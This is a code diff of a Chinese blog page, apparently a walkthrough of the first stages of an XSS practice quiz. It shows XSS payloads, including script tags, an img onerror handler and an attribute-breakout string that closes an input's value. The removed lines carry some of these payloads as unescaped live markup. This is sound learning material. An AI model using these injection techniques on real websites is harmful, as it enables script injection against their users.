@@ -295,8 +295,24 @@
             <blockquote>
 <p>这个挺有意思的，好像日本的一个学生写的，入门XSS，感觉学到了不少！</p>
 </blockquote>
-<h1 id="第一关："><a href="#第一关：" class="headerlink" title="第一关："></a>第一关：</h1><font color="red">我是红色的</font><br>&gt; <font color="red"><a href="http://xss-quiz.int21h.jp/?sid=7b714949025dc80a78855d84fc428ef4b4601ab5" target="_blank" rel="external">http://xss-quiz.int21h.jp/?sid=7b714949025dc80a78855d84fc428ef4b4601ab5</a></font><br><br><br>    <img onerror="alert(document.domain);" src="/"><br>or<br><br>    <script>alert(document.domain);</script><br><br># 第二关<br>&gt; <font color="red"><a href="http://xss-quiz.int21h.jp/stage2.php?sid=8e7ed5afb72d0df250f54279ef8a868d8e0aafa7" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage2.php?sid=8e7ed5afb72d0df250f54279ef8a868d8e0aafa7</a></font><br><br><br>先用<br><br>    <script>alert(document.domain);</script><br>检查源码，发现，组成<br><br>    <input size="50" value="<script>alert(document.domain);</script>" name="p1"><br>没有过滤，可以组合js，闭合<code>value=&quot;&quot;</code>，进行注入！<br><br>    “&gt;<script>alert(document.domain);</script>&lt;<br><br># 第三关<br>&gt; <font color="red"><a href="http://xss-quiz.int21h.jp/stage-3.php?sid=387be4b596182a93c5eea6e6dfd85d69b23c9f82" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage-3.php?sid=387be4b596182a93c5eea6e6dfd85d69b23c9f82</a></font>
+<h1 id="第一关："><a href="#第一关：" class="headerlink" title="第一关："></a>第一关：</h1><font color="red">我是红色的</font><br>&gt; <font color="red"><a href="http://xss-quiz.int21h.jp/?sid=7b714949025dc80a78855d84fc428ef4b4601ab5" target="_blank" rel="external">http://xss-quiz.int21h.jp/?sid=7b714949025dc80a78855d84fc428ef4b4601ab5</a></font>
 
+<pre><code>&lt;img onerror=&quot;alert(document.domain);&quot; src= /&gt; 
+</code></pre><p>or</p>
+<pre><code>&lt;script&gt;alert(document.domain);&lt;/script&gt;
+</code></pre><h1 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h1><blockquote>
+<p><font color="red"><a href="http://xss-quiz.int21h.jp/stage2.php?sid=8e7ed5afb72d0df250f54279ef8a868d8e0aafa7" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage2.php?sid=8e7ed5afb72d0df250f54279ef8a868d8e0aafa7</a></font><br></p>
+</blockquote>
+<p>先用</p>
+<pre><code>&lt;script&gt;alert(document.domain);&lt;/script&gt;
+</code></pre><p>检查源码，发现，组成</p>
+<pre><code>&lt;INPUT size=50 value=&quot;&lt;script&gt;alert(document.domain);&lt;/script&gt;&quot; name=p1&gt;
+</code></pre><p>没有过滤，可以组合js，闭合<code>value=&quot;&quot;</code>，进行注入！</p>
+<pre><code>&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;&lt;
+</code></pre><h1 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h1><blockquote>
+<font color="red"><a href="http://xss-quiz.int21h.jp/stage-3.php?sid=387be4b596182a93c5eea6e6dfd85d69b23c9f82" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage-3.php?sid=387be4b596182a93c5eea6e6dfd85d69b23c9f82</a></font>
+
+</blockquote>
 <p>输入：</p>
 <pre><code>&lt;script&gt;alert(document.domain);&lt;/script&gt;
 </code></pre><p>源码显示：</p>
